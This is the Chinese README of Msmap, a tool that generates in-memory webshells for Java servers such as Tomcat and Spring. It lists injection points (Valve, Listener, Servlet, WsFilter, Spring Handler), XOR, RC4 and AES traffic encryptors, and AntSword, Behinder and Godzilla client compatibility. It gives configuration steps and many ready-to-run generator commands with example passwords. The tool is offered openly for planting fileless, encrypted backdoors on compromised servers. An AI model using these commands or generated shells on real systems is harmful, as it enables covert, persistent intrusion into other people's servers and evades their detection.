# MSMAP

Msmap是一个内存马生成器，兼容多种容器、组件、编码器、*WebShell / Proxy / Killer* 和管理客户端。[English](README.md)

[背后的想法（一）](https://hosch3n.github.io/2022/08/08/Msmap%E5%86%85%E5%AD%98%E9%A9%AC%E7%94%9F%E6%88%90%E6%A1%86%E6%9E%B6%EF%BC%88%E4%B8%80%EF%BC%89/)，[背后的想法（二）](https://hosch3n.github.io/2022/08/09/Msmap%E5%86%85%E5%AD%98%E9%A9%AC%E7%94%9F%E6%88%90%E6%A1%86%E6%9E%B6%EF%BC%88%E4%BA%8C%EF%BC%89/), [背后的想法（三）](https://hosch3n.github.io/2022/10/29/Msmap%E5%86%85%E5%AD%98%E9%A9%AC%E7%94%9F%E6%88%90%E6%A1%86%E6%9E%B6%EF%BC%88%E4%B8%89%EF%BC%89/)

![](img/a.png)

![](img/b.png)

![](img/c.png)

<details>
<summary>功能 [WIP]</summary>

### Function

- [x] 动态菜单
- [x] 自动编译
- [x] 生成脚本
- [ ] 精简模式
- [ ] 图形界面

### Container

- Java
  - [x] Tomcat7
  - [x] Tomcat8
  - [x] Tomcat9
  - [x] Tomcat10
  - [ ] Resin3
  - [x] Resin4
  - [ ] WebSphere
  - [ ] GlassFish
  - [ ] WebLogic
  - [ ] JBoss
  - [x] Spring*
  - [ ] Netty
  - [x] JVM*
- .NET
  - [ ] IIS
- PHP
- Python

*：SpringHandler仅支持JDK8+

*：默认支持`Linux Tomcat 8/9`，可以根据进阶指南适配更多版本

### WebShell / Proxy / Killer

- WebShell
  - [x] CMD / SH
  - [x] AntSword
  - [x] JSPJS
  - [x] Behinder
  - [x] Godzilla

- *没有模块化的必要*

~~Proxy: Neo-reGeorg, wsproxy~~

~~Killer: java-memshell-scanner, ASP.NET-Memshell-Scanner~~

### Decoder / Decryptor / Hasher

- Decoder
  - [x] Base64
  - [ ] Hex
- Decryptor
  - [x] XOR
  - [x] RC4
  - [x] AES128
  - [x] AES256
  - [ ] RSA
- Hasher
  - [x] MD5
  - [x] SHA128
  - [x] SHA256

</details>

## 用法

``` bash
git clone git@github.com:hosch3n/msmap.git
cd msmap
python generator.py
```

> [注意] 尽量用独一无二的密码；各选项大小敏感

### 进阶

编辑 `config/environment.py`

``` python
# 自动编译
auto_build = True

# Base64编码类字节码
b64_class = True

# 生成脚本
generate_script = True

# 编译器绝对路径
java_compiler_path = r"~/jdk1.6.0_04/bin/javac"
dotnet_compiler_path = r"C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe"
```

编辑 `gist/java/container/tomcat/servlet.py`

``` java
// Servlet路径匹配规则
private static String pattern = "*.xml";
```

如果WsFilter使用了加密编码器，密码需要与路径相同（如`/passwd`）

可以根据目标容器替换 `gist/java/container/jdk/javax.py` 与 `lib/servlet-api.jar`

`pip3 install pyperclip` 可启用自动复制到系统剪切板

## 示例

<details>
<summary>CMD / SH</summary>

系统**命令** 搭配 **Base64** 编码器 | 注入到 Tomcat Valve

`python generator.py Java Tomcat Valve Base64 CMD passwd`

</details>

<details>
<summary>蚁剑</summary>

**JSP**类型 搭配 **default** 编码器 | 注入到 Tomcat Valve

`python generator.py Java Tomcat Valve RAW AntSword passwd`

**JSP**类型 搭配 **[aes_128_ecb_pkcs7_padding_md5](extend/AntSword/encoder/aes_128_ecb_pkcs7_padding_md5.js)** 编码器 | 注入到 Tomcat Listener

`python generator.py Java Tomcat Listener AES128 AntSword passwd`

**JSP**类型 搭配 **[rc_4_sha256](extend/AntSword/encoder/rc_4_sha256.js)** 编码器 | 注入到 Tomcat Servlet

`python generator.py Java Tomcat Servlet RC4 AntSword passwd`

**JSP**类型 搭配 **[xor_md5](extend/AntSword/encoder/xor_md5.js)** 编码器 | AgentFiless注入到 HttpServlet

`python generator.py Java JDK JavaX XOR AntSword passwd`

**JSPJS**类型 搭配 **[aes_128_ecb_pkcs7_padding_md5](extend/AntSword/encoder/aes_128_ecb_pkcs7_padding_md5.js)** 编码器 | 注入到 Tomcat WsFilter

`python generator.py Java Tomcat WsFilter AES128 JSPJS passwd`

**JSPJS**类型 搭配 **[xor_md5](extend/AntSword/encoder/xor_md5.js)** 编码器 | 注入到 Spring Handler

`python generator.py Java Spring Handler XOR JSPJS passwd`

</details>

<details>
<summary>冰蝎</summary>

**default_aes**类型 | 注入到 Tomcat Valve

`python generator.py Java Tomcat Valve AES128 Behinder rebeyond`

**default_xor_base64**类型 | 注入到 Spring Interceptor

`python generator.py Java Spring Interceptor XOR Behinder rebeyond`

</details>

<details>
<summary>哥斯拉</summary>

**JAVA_AES_BASE64**类型 | 注入到 Tomcat Valve

`python generator.py Java Tomcat Valve AES128 Godzilla superidol`

**JAVA_AES_BASE64**类型 | AgentFiless注入到 HttpServlet

`python generator.py Java JDK JavaX AES128 Godzilla superidol`

**JAVA_AES_BASE64**类型 | 注入到 Spring Handler

`python generator.py Java Spring Handler AES128 Godzilla superidol`

> [已知问题](https://github.com/BeichenDream/Godzilla/issues/76)

</details>

## Reference

[GodzillaMemoryShellProject](https://github.com/BeichenDream/GodzillaMemoryShellProject)

[AntSword-JSP-Template](https://github.com/AntSwordProject/AntSword-JSP-Template)

[As-Exploits memshell_manage](https://github.com/yzddmr6/As-Exploits/tree/master/core/memshell_manage)

[Behinder](https://github.com/rebeyond/Behinder) | [wsMemShell](https://github.com/veo/wsMemShell) | [ysomap](https://github.com/wh1t3p1g/ysomap)